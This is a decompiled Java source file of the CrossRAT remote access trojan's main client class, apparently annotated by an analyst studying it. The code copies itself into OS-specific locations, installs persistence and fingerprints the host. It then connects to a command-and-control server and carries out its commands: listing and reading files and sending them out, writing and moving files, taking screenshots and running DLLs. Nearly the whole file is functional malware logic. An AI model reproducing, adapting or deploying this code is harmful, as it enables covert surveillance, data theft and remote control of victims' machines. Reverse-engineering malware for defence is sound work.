package crossrat;

import java.awt.GraphicsEnvironment;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URLDecoder;
import java.util.UUID;
import java.util.prefs.Preferences;

/* loaded from: hmar6.jar:crossrat/client.class */
public class client {
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v115, types: [java.io.File] */
    /* JADX WARN: Type inference failed for: r0v21, types: [java.io.File] */
    /* JADX WARN: Type inference failed for: r0v22, types: [java.lang.Exception] */
    public static void main(String[] strArr) {
        Exception exc;
        String[] split;
        b.a bVar;
        a.a b2 = a.c.b(); // b2 is some sort of system. When "b2.a()" is called it queries to see what type of OS there is.
        String property = System.getProperty("java.io.tmpdir");
        File file = new File(URLDecoder.decode(client.class.getProtectionDomain().getCodeSource().getLocation().getPath(), "UTF-8"));
        k.filepath_for_CrossRAT = "";
        if (b2.a() == a.c.WINDOWS) { // Checks if OS version is Windows
            k.filepath_for_CrossRAT = String.valueOf(property) + "\\"; // set filepath for the CrossRAT jar to be located at "java.io.tmpdir\\"
        } else if (b2.a() == a.c.MACOS) { // Checks if OS is macOS
            k.filepath_for_CrossRAT = String.valueOf(System.getProperty("user.home")) + "/Library/"; // set filepath for CrossRAT to be located at "/Home/Library/CrossRAT"
        } else {
            k.filepath_for_CrossRAT = "/usr/var/"; // If neither macOS or Windows, then Linux.
        }
        ?? file2 = new File(String.valueOf(k.filepath_for_CrossRAT) + "mediamgrs.jar"); // Create the jar file at the filepath for CrossRAT and call it mediamgrs.jar
        try {
            file2 = file;
            org.a.a.a.b.a(file2, file2);
            exc = file2;
        } catch (Exception e) {
            file2.printStackTrace();
            exc = file2;
        }
        try {
            String file3 = file2.toString();
            a.a b3 = a.c.b();
            if (b3.a() == a.c.WINDOWS) {
                bVar = new b.e("mediamgrs", file3, true);
            } else if (b3.a() == a.c.MACOS) {
                bVar = new b.c("mediamgrs", file3, true);
            } else if (b3.d() && !GraphicsEnvironment.getLocalGraphicsEnvironment().isHeadlessInstance()) {
                bVar = new b.d("mediamgrs", file3, true);
            } else if (!b3.d()) {
                throw new RuntimeException("Unknown operating system " + b3.c());
            } else {
                bVar = new b.b("mediamgrs", file3, true);
            }
            bVar.a();
        } catch (Exception e2) {
            exc.printStackTrace();
        }
        Preferences userRoot = Preferences.userRoot();
        k.h = userRoot;
        String str = userRoot.get("UID", null);
        k.g = str;
        if (str == null) {
            UUID randomUUID = UUID.randomUUID();
            k.f = randomUUID;
            k.g = randomUUID.toString();
            k.h.put("UID", k.g);
        }
        String property2 = System.getProperty("os.name");
        String property3 = System.getProperty("os.version");
        String property4 = System.getProperty("user.name");
        String str2 = String.valueOf(property4) + "^" + InetAddress.getLocalHost().getHostName();
        while (true) {
            try {
                Socket socket = new Socket(k.C2_URL, k.C2_PORT);
                socket.setSoTimeout(120000);
                k.k = socket;
                new DataOutputStream(socket.getOutputStream()).writeBytes(String.valueOf(k.g) + k.arg_delimit + k.client_hello + k.arg_delimit + e.b() + k.arg_delimit + property2 + k.arg_delimit + property3 + k.arg_delimit + str2 + k.arg_delimit + k.version_num + k.arg_delimit + k.campaign_num + k.arg_delimit + "&&&");
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                PrintStream printStream = new PrintStream(socket.getOutputStream(), true);
                while (true) {
                    try {
                        try {
                            split = bufferedReader.readLine().split("\\" + k.arg_delimit);
                        } catch (Exception unused) {
                        }
                        if (split[0].equals(k.enum_root_dir)) {
                            new e();
                            e.a();
                            new f().start();
                        } else if (split[0].equals(k.enum_files)) {
                            new c(split[1]).start();
                        } else if (split[0].equals(k.create_blank_file)) {
                            new a(split[1]).start();
                        } else if (split[0].equals(k.copy_file)) {
                            new b(split[1], split[2]).start();
                        } else if (split[0].equals(k.move_file)) {
                            new h(split[1], split[2]).start();
                        } else if (split[0].equals(k.write_file_contents)) {
                            new d(k.C2_URL, k.C2_PORT, split[1], split[2], split[3], "0").start();
                        } else if (split[0].equals(k.read_file_contents)) {
                            new d(k.C2_URL, k.C2_PORT, split[1], split[2], split[3], "1").start();
                        } else if (split[0].equals(k.status_request)) {
                            new g().start();
                        } else if (split[0].equals(k.get_screenshot)) {
                            new j(k.C2_URL, k.C2_PORT).start();
                        } else if (split[0].equals(k.WIN_RUN_DLL)) {
                            new i(split[1]).start();
                        }
                    } catch (Exception unused2) {
                        System.out.println("ERROR");
                        socket.close();
                        printStream.close();
                        bufferedReader.close();
                        bufferedReader.close();
                        printStream.close();
                        socket.close();
                    }
                }
            } catch (Exception unused3) {
                try {
                    Thread.sleep(5000L);
                } catch (InterruptedException unused4) {
                }
            }
        }
    }
}
